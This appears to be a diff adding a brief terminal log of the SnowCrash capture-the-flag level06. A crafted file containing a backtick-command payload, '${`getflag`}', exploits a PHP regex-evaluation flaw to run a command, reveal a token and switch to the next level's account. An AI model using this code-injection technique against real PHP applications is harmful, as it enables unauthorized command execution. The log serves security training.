@@ -1,0 +1,13 @@
+level06@SnowCrash:~$ echo "start [x a.b] end" > /tmp/ptr
+level06@SnowCrash:~$ ./level06 /tmp/ptr
+start a x b end
+
+level06@SnowCrash:~$ echo "[x \${\`getflag\`}]" > /tmp/ptr
+
+level06@SnowCrash:~$ ./level06 /tmp/ptr
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+
+level06@SnowCrash:~$ su level07
+Password: /wiok45aaoguiboiki2tuin6ub/
+level07@SnowCrash:~$
